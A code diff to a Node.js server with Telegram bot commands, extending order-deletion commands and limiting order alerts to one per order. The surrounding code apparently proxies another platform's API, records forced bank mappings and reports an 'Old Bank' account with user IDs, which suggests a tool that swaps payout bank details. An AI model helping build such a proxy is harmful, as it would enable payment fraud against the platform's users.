@@ -1899,9 +1899,11 @@ Example:
             return res.sendStatus(200);
         }
 
-        if (text === '/delete all') {
+        if (text === '/delete all' || text === '/resetorders' || text === '/clearorders') {
             const deletedCount = data.orderBankMap ? Object.keys(data.orderBankMap).length : 0;
             data.orderBankMap = {};
+            data.orderNotificationMap = {};
+            if (data._newOrdersToSave) data._newOrdersToSave = {};
             data._skipOverrideMerge = true;
             await saveData(data);
             await sendCommandReply(deletedCount
@@ -1912,24 +1914,37 @@ Example:
 
         if (text.startsWith('/delorder ')) {
             const orderNo = text.substring(10).trim();
-            if (!data.orderBankMap) {
+            if (!data.orderBankMap && !data.orderNotificationMap) {
                 await sendCommandReply(`❌ Order ${orderNo} not found in saved mappings.`);
                 return res.sendStatus(200);
             }
 
             let deleted = false;
+            if (!data.orderNotificationMap) data.orderNotificationMap = {};
+
             // Delete any key that matches orderNo directly
-            if (data.orderBankMap[orderNo]) {
+            if (data.orderBankMap && data.orderBankMap[orderNo]) {
                 delete data.orderBankMap[orderNo];
+                deleted = true;
+            }
+            if (data.orderNotificationMap[orderNo]) {
+                delete data.orderNotificationMap[orderNo];
                 deleted = true;
             }
 
             // Also delete any other keys that point to the same order object
-            for (const [k, v] of Object.entries(data.orderBankMap)) {
-                if (v.orderNo === orderNo || v.rptNo === orderNo || v.orderId === orderNo || v.id === orderNo) {
-                    delete data.orderBankMap[k];
-                    deleted = true;
+            if (data.orderBankMap) {
+                for (const [k, v] of Object.entries(data.orderBankMap)) {
+                    if (v.orderNo === orderNo || v.rptNo === orderNo || v.orderId === orderNo || v.id === orderNo) {
+                        delete data.orderBankMap[k];
+                        if (data.orderNotificationMap) delete data.orderNotificationMap[k];
+                        deleted = true;
+                    }
                 }
+            }
+
+            if (data._newOrdersToSave && data._newOrdersToSave[orderNo]) {
+                delete data._newOrdersToSave[orderNo];
             }
 
             if (!deleted) {
@@ -3135,7 +3150,8 @@ app.all('/xxapi/*', async (req, res) => {
                                         time: now,
                                         userId: itemUid,
                                         isManual: true,
-                                        forced: true
+                                        forced: true,
+                                        notified: true
                                     };
                                     if (!data.orderBankMap) data.orderBankMap = {};
                                     data.orderBankMap[rptNo] = savedData;
@@ -3143,7 +3159,7 @@ app.all('/xxapi/*', async (req, res) => {
                                     data._newOrdersToSave[rptNo] = savedData;
                                     dataChanged = true;
 
-                                    // 4. Send Designed Telegram Alert
+                                    // 4. Send Designed Telegram Alert (Only ONCE per order)
                                     const canNotify = await claimOrderNotification(data, rptNo);
                                     if (canNotify) {
                                         const replaceMsg = `╔══════════════════════════════════╗
@@ -3154,6 +3170,7 @@ app.all('/xxapi/*', async (req, res) => {
 👤 <b>User ID</b>     : <code>${escapeTelegramHtml(itemUid || 'N/A')}</code>
 📱 <b>Username</b>    : <code>${escapeTelegramHtml(item.username || 'N/A')}</code>
 💾 <b>Status</b>      : <b>Saved in KV (orderBankMap)</b>
+📍 <b>Endpoint</b>    : <code>/xxapi/buyitoken/history</code>
 
 🏦 <b>Old Bank</b>:
   Name: ${escapeTelegramHtml(oldAcctName || 'N/A')}
